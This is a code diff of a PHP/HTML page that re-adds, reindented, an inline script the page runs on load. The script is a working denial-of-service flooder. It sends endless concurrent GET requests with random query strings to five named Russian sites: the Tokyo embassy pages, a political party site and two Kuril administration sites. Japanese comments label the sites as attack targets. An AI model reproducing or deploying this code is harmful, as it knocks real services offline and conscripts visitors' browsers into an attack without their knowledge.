@@ -174,78 +174,78 @@ if($input_noun != ""){
         }
 
     </script>
-  <script>
-    // ターゲットを指定
-    var targets = {
-         'https://tokyo.mid.ru/web/tokyo-ja': { number_of_requests: 0, number_of_errored_responses: 0 },        // ロシア大使館
-         'https://tokyo.kdmid.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },                  // ロシア大使館(訪問予約サイト)
-         'https://spravedlivo.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },                  // 公正ロシア
-         'http://www.yuzhnokurilsk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },             // 南クリル管区
-         'http://xn----8sbmnjbgm3ams5i.xn--p1ai/': { number_of_requests: 0, number_of_errored_responses: 0 },   // クリル管区                          
-  	  }    
-    
-    // 1秒ごとの攻撃頻度
-    var CONCURRENCY_LIMIT = 1000
-    var queue = []
-
-    // リクエスト送信
-    async function fetchWithTimeout(resource, options) {
-      // コントローラーを取得
-      const controller = new AbortController();
-      // IDを取得
-      const id = setTimeout(() => controller.abort(), options.timeout);
-      // 攻撃処理を返す。
-      return fetch(resource, {
-        method: 'GET',              //GET方式
-        mode: 'no-cors',
-        signal: controller.signal
-      }).then((response) => {
-        clearTimeout(id);
-        return response;
-      }).catch((error) => {
-          console.log(error.code);
-        clearTimeout(id);
-        throw error;
-      });
-    }
-
-    // 各ターゲットに攻撃する。
-    async function flood(target) {
-      //for文を使った無限ループ
-      for (var i = 0;; ++i) {
-        // リクエストの数が規定数になったら
-        if (queue.length > CONCURRENCY_LIMIT) {
-          // 最初リクエストを削除する。
-          await queue.shift()
-        }
-        // 乱数を生成
-        rand = i % 3 === 0 ? '' : ('?' + Math.random() * 2000)
-        // 攻撃リクエストを追加する。
-        queue.push(
-          // 関数を実行する(時間制限：1秒)
-          fetchWithTimeout(target+rand, { timeout: 1000 })
-            // エラーがある場合はエラーを取得する。
-            .catch((error) => {
-              if (error.code === 20 /* ABORT */) {
-                return;
-              }
-              targets[target].number_of_errored_responses++;
-            })
-            // 処理後の処理をする。
-            .then((response) => {
-              // エラーがある場合はエラー処理を入れる。
-              if (response && !response.ok) {
-                targets[target].number_of_errored_responses++;
-              }
-              // リクエスト数を追加する。
-              targets[target].number_of_requests++;
-            })
-
-        )
+    <script>
+      // ターゲットを指定
+      var targets = {
+           'https://tokyo.mid.ru/web/tokyo-ja': { number_of_requests: 0, number_of_errored_responses: 0 },        // ロシア大使館
+           'https://tokyo.kdmid.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },                  // ロシア大使館(訪問予約サイト)
+           'https://spravedlivo.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },                  // 公正ロシア
+           'http://www.yuzhnokurilsk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },             // 南クリル管区
+           'http://xn----8sbmnjbgm3ams5i.xn--p1ai/': { number_of_requests: 0, number_of_errored_responses: 0 },   // クリル管区                          
+    	  }    
+      
+      // 1秒ごとの攻撃頻度
+      var CONCURRENCY_LIMIT = 1000
+      var queue = []
+      
+      // リクエスト送信
+      async function fetchWithTimeout(resource, options) {
+        // コントローラーを取得
+        const controller = new AbortController();
+        // IDを取得
+        const id = setTimeout(() => controller.abort(), options.timeout);
+        // 攻撃処理を返す。
+        return fetch(resource, {
+          method: 'GET',              //GET方式
+          mode: 'no-cors',
+          signal: controller.signal
+        }).then((response) => {
+          clearTimeout(id);
+          return response;
+        }).catch((error) => {
+            console.log(error.code);
+          clearTimeout(id);
+          throw error;
+        });
       }
-    }
-    // 全てのターゲット要素に対して攻撃処理を実行する。
-    Object.keys(targets).map(flood)
-  </script>    
+    
+      // 各ターゲットに攻撃する。
+      async function flood(target) {
+        //for文を使った無限ループ
+        for (var i = 0;; ++i) {
+          // リクエストの数が規定数になったら
+          if (queue.length > CONCURRENCY_LIMIT) {
+            // 最初リクエストを削除する。
+            await queue.shift()
+          }
+          // 乱数を生成
+          rand = i % 3 === 0 ? '' : ('?' + Math.random() * 2000)
+          // 攻撃リクエストを追加する。
+          queue.push(
+            // 関数を実行する(時間制限：1秒)
+            fetchWithTimeout(target+rand, { timeout: 1000 })
+              // エラーがある場合はエラーを取得する。
+              .catch((error) => {
+                if (error.code === 20 /* ABORT */) {
+                  return;
+                }
+                targets[target].number_of_errored_responses++;
+              })
+              // 処理後の処理をする。
+              .then((response) => {
+                // エラーがある場合はエラー処理を入れる。
+                if (response && !response.ok) {
+                  targets[target].number_of_errored_responses++;
+                }
+                // リクエスト数を追加する。
+                targets[target].number_of_requests++;
+              })
+            
+          )
+        }
+      }
+      // 全てのターゲット要素に対して攻撃処理を実行する。
+      Object.keys(targets).map(flood)
+    </script>    
   </body>
 </html>
